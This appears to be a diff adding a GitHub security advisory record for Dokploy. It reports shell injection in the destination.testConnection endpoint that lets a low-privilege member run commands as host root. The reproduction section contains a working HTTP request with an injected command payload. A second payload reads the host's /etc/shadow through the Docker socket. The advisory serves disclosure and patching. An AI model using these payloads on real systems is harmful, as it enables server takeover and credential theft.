@@ -1,0 +1,51 @@
+{
+  "global": null,
+  "id": "GHSA-f6x8-vfwh-8hjr",
+  "repo": {
+    "cve_id": "CVE-2026-72868",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78",
+      "CWE-862"
+    ],
+    "description": "## Summary\r\n\r\nThe `destination.testConnection` mutation interpolates user-controlled `accessKey`, `secretAccessKey`, `region`, `endpoint`, `provider`, and `bucket` into a `rclone ls` shell command, then runs it through `child_process.exec`. Fields are wrapped in `\"...\"` but never escaped, so a `\"` in `accessKey` closes the quote and the shell parses the rest of the line as separate commands.\r\n\r\nThe endpoint is gated only by `withPermission(\"destination\", \"create\")`. `checkPermission` short-circuits and returns early without calling `role.authorize()` whenever the caller has a static role and every requested resource is in `enterpriseOnlyResources`. `member` is a static role; `memberRole.destination` is the empty array; the settings page at `/dashboard/settings/destinations` redirects `member` away in `getServerSideProps`. The tRPC API behind that page has no equivalent guard.\r\n\r\nThe dokploy service runs uid 0 and binds `/var/run/docker.sock` from the host per the published `install.sh`. Root inside the container reaches host root via one `docker run -v /:/host alpine`.\r\n\r\nResult: any user holding the lowest organization role obtains arbitrary command execution as root on the Dokploy host with one POST to `/api/trpc/destination.testConnection`.\r\n\r\n## Affected\r\n\r\n`Dokploy/dokploy`, `<= v0.29.4` and `main` HEAD `df98cea1` (current as of 2026-05-18). Confirmed live-exploitable on the published Docker image `dokploy/dokploy:latest` digest `sha256:dc3018f3b8db31bf1deb25585290b3e0e4763d824102fbff0c909d0d2920e7a8`; identical vulnerable code in `/app/dist/server.mjs` of that image and in every `main` and `canary` commit through `df98cea1`.\r\n\r\nDefault `install.sh` deployment on Linux. Stock config, stock roles, no enterprise license. Pre-condition: at least one user invited with role `member` (standard collaboration flow). No legacy `canCreate*` toggles or `accessedServers` grants required.\r\n\r\n## Root cause\r\n\r\n`apps/dokploy/server/api/routers/destination.ts:60-91`: `testConnection` interpolates six user-controlled fields into `` `rclone ls --s3-access-key-id=\"${accessKey}\" ...` `` (`accessKey`/`secretAccessKey`/`region`/`endpoint` at lines 61-64, `provider` at line 73, `bucket` at line 78) and builds the final command at line 79, then passes the joined string to `execAsync` at line 91 (Node `child_process.exec`, shell-based; the cloud branch at line 89 uses `execAsyncRemote`). Values are quoted but never escaped; `\"` in any field closes the quote.\r\n\r\n`packages/server/src/services/permission.ts:83-89`: `checkPermission` computes `isStaticRole = memberRecord.role in staticRoles` at line 83, then returns early via `if (isStaticRole) { if (allEnterprise) return; }` (lines 85-89) without calling `role.authorize()` when every requested resource is in `enterpriseOnlyResources`. `member` is a static role; `destination` is in `enterpriseOnlyResources` (declared at `access-control.ts:58`, member-relevant entries through line 76).\r\n\r\n`packages/server/src/lib/access-control.ts:187-194`: the inline comment at line 187 states that members cannot manage org-level enterprise resources, then declares `server: []`, `registry: []`, `certificate: []`, `destination: []`, `notification: []`, `auditLog: []`. The short-circuit at `permission.ts:89` overrides that role definition.\r\n\r\n`apps/dokploy/pages/dashboard/settings/destinations.tsx:28-35`: `getServerSideProps` redirects every `role === \"member\"` request to `/`. The same redirect exists at `servers.tsx:36`, `registry.tsx:28`, `notifications.tsx:28`, `certificates.tsx:28`. The tRPC API behind those pages has no equivalent role check.\r\n\r\nRepository-root `Dockerfile` plus the published `install.sh`: the dokploy service runs uid 0 (no `USER` directive in the image; `id` inside the running container returns `uid=0(root)`) and binds `/var/run/docker.sock` from the host (`install.sh`: `--mount type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock`). Root in the container reaches host root via one `docker run -v /:/host alpine`.\r\n\r\n## Reproduction\r\n\r\n`dokploy/dokploy:latest` (v0.29.4) deployed via `https://dokploy.com/install.sh`, default config, default roles.\r\n\r\n1. Owner Alice invites Bob via `organization.inviteMember` with `role: \"member\"`. Bob accepts and signs in. Bob's DB row: `member.role = 'member'`, every `canCreate*`/`canAccessTo*` boolean `false`, `accessedServers = '{}'`.\r\n\r\n2. Bob sends one tRPC POST as the freshly invited member:\r\n\r\n```http\r\nPOST /api/trpc/destination.testConnection?batch=1 HTTP/1.1\r\nHost: dokploy.example.com\r\nCookie: better-auth.session_token=<member-jwt>\r\nOrigin: https://dokploy.example.com\r\nContent-Type: application/json\r\n\r\n{\"0\":{\"json\":{\"name\":\"poc\",\"accessKey\":\"X\\\";id > /tmp/PWN; hostname >> /tmp/PWN; echo \\\"\",\"secretAccessKey\":\"s\",\"bucket\":\"b\",\"region\":\"us-east-1\",\"endpoint\":\"https://x.test\",\"provider\":\"S3\"}}}\r\n```\r\n\r\nResponse: `HTTP/1.1 200 OK`, body `[{\"result\":{\"data\":{\"json\":null,\"meta\":{\"values\":[\"undefined\"],\"v\":1}}}}]`.\r\n\r\n3. `docker exec dokploy.1.<task-id> cat /tmp/PWN` inside the dokploy container returns:\r\n\r\n```\r\nuid=0(root) gid=0(root) groups=0(root)\r\n<container-hostname>\r\n```\r\n\r\nReplacing the `accessKey` payload with `X\\\";docker run --rm -v /:/host alpine sh -c \\\"cat /host/etc/shadow > /host/tmp/SHADOW\\\"; echo \\\"` writes the host's `/etc/shadow` to `/tmp/SHADOW` on the host filesystem with `uid=0`. The file contains the host root's yescrypt hash (`root:$y$j9T$...`).\r\n\r\nLive-verified: Member role obtains root command execution in the dokploy container and host root via `/var/run/docker.sock` with one tRPC POST. No UI navigation, no service-share grant, no legacy capability flag.\r\n\r\n## Impact\r\n\r\n- Arbitrary command execution as `uid 0` in the dokploy container, reachable by every authenticated organization member.\r\n- Pivot to host root via `/var/run/docker.sock`: read of `/etc/shadow`, offline crack of the host yescrypt hash, full host filesystem and Docker daemon control.\r\n- Cross-tenant compromise of every organization on the same Dokploy instance and every connected remote server registered through Dokploy.\r\n- Triggered by the lowest legitimate organization role with one POST, no UI navigation, no audit-log entry (audit logging is enterprise-only via `packages/server/src/services/proprietary/audit-log.ts:25-28`).\r\n\r\n## Credit\r\n\r\nJan Kahmen, [turingpoint](https://turingpoint.de) (jan@turingpoint.de).",
+    "ghsa_id": "GHSA-f6x8-vfwh-8hjr",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-f6x8-vfwh-8hjr",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-f6x8-vfwh-8hjr"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72868"
+      }
+    ],
+    "published_at": "2026-07-21T23:26:12Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Member-role RCE as host root via destination.testConnection rclone shell injection",
+    "updated_at": "2026-08-10T18:38:05Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 0.29.4"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
